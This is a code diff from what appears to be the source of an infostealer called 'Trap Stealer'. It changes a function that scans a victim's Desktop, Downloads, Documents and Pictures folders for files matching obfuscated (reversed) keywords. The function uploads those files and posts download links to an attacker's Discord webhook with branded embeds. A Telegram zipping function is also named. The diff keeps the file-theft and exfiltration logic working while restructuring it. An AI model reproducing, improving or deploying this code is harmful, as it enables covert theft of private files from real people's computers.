@@ -789,64 +789,57 @@ def upload_files_to_discord():
     downloads_path = os.path.expanduser("~/Downloads")
     documents_path = os.path.expanduser("~/Documents")
     pictures_path = os.path.expanduser("~/Pictures")
-    music_path = os.path.expanduser("~/Music")
-    videos_path = os.path.expanduser("~/Videos")
-    applications_path = os.path.expanduser("~/Applications")
-    public_path = os.path.expanduser("~/Public")
-    templates_path = os.path.expanduser("~/Templates")
-    downloads_documents_path = os.path.join(downloads_path, "Documents")
-    downloads_pictures_path = os.path.join(downloads_path, "Pictures")
 
     file_paths = []
+    try:
+        for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+            for file in os.listdir(path):
+                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                    file_path = os.path.join(path, file) 
+                    file_paths.append(file_path)
 
-    for path in [desktop_path, downloads_path, documents_path, pictures_path]:
-        for file in os.listdir(path):
-            if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                file_path = os.path.join(path, file) 
-                file_paths.append(file_path)
-
-    urls = []
-
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = []
-        try:
-            for file_path in file_paths:
-                futures.append(executor.submit(upload_file, file_path))
-            for future, file_path in zip(futures, file_paths):
-                url = future.result()
-                if url:
-                    urls.append((os.path.basename(file_path), url))
-                else:
-                    pass
-        finally:
-            executor.shutdown(wait=True)
-
-
-    if urls:
-        embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
-
-        data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": "🍪 Trap Stealer Files",
-                    "description": "New files have been uploaded:",
-                    "color": 0xffb6c1,
-                    "fields": embed_fields,
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        urls = []
+    
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = []
+            try:
+                for file_path in file_paths:
+                    futures.append(executor.submit(upload_file, file_path))
+                for future, file_path in zip(futures, file_paths):
+                    url = future.result()
+                    if url:
+                        urls.append((os.path.basename(file_path), url))
+                    else:
+                        pass
+            finally:
+                executor.shutdown(wait=True)
+    
+    
+        if urls:
+            embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
+    
+            data = {
+                "username": "Trap Stealer",
+                "content": "",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": "🍪 Trap Stealer Files",
+                        "description": "New files have been uploaded:",
+                        "color": 0xffb6c1,
+                        "fields": embed_fields,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
                     }
-                }
-            ]
-        }
-
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+                ]
+            }
+    
+            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
